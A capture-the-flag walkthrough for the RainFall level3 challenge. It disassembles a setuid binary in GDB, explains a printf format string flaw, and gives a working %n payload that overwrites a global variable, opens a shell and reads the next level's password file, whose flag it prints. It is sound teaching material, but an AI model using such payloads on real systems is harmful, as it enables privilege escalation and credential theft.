## Walkthrough

We list the files in the current home directory.

```bash
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
level3@RainFall:~$ file level3
level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
 dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
 BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```

The file is owned by **level4** and has the **setuid** bit.

We list the functions inside the executable and analyze their assembly code with **GDB**.

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini
```

There are 2 interesting functions: `main()` and `v()`.

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
```

The `main()` function only calls the `v()` function.

```nasm
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```

The function:

- Calls `fgets()` to read input into a buffer located at `ebp - 0x208`
- Calls `printf()` to print the buffer to stdout
- Retrieves the value of a global variable stored at memory address `0x804988c` into the `%eax` register
- Compares the value of `%eax` with`64` (`0x40` in hexadecimal)
- If the value is equal to `64` :
    - Prints a message using the `fwrite()` function ****
    - Calls the system’s shell `/bin/sh`  using the `system()` function.

### Format string vulnerability

This function is subjected to a format string vulnerability which occurs when a user input is improperly used as a format string in functions like `printf()`, allowing attackers to manipulate memory, access sensitive data, or execute arbitrary code.

Our goal is to overwrite the value of the global variable stored at the address `0x804988c`(the compared to 64) and replace it with the number 64.

The `printf()` function includes the specifier `%n` which writes the number of characters printed so far into the address provided as its corresponding argument. This allows us to overwrite a specific memory address with the number of characters printed by the format string.

### Converting the address

The global variable (whose value is stored in the `%eax` register and compared to `64`) is located at the address `0x804988c`. To properly inject this address into the format string, we need to represent it in **little-endian** format, asthis is how memory addresses are stored on the target system. The little-endian format for the address `0x804988c` is:  `\x8c\x98\x04\x08` .

**Little-endian** is a way of representing multi-byte data in memory where the **least significant byte** (the "lowest" byte) is stored at the **lowest memory address**, and the **most significant byte** is stored at the highest memory address.

### Overwriting the address

To achieve our goal, we need to craft a string such that the total number of characters printed is `64`. The `%n` specifier will then overwrite the global variable at `0x804988c` with the number `64` (the number of characters printed). Each `%x` will print a 4-byte value, each  `.`  is a 1-byte character and the `%45x` will print 45-byte scharacters (filling with 0 or spaces). This gives us : 

```bash
'.%x.%x.%45x.%n'
```

### Final command
```bash
The final command is :
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + '.%x.%x.%45x.%n')"; cat) | ./level3 
�.200.b7fd1ac0.                                     b7ff37d0.
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
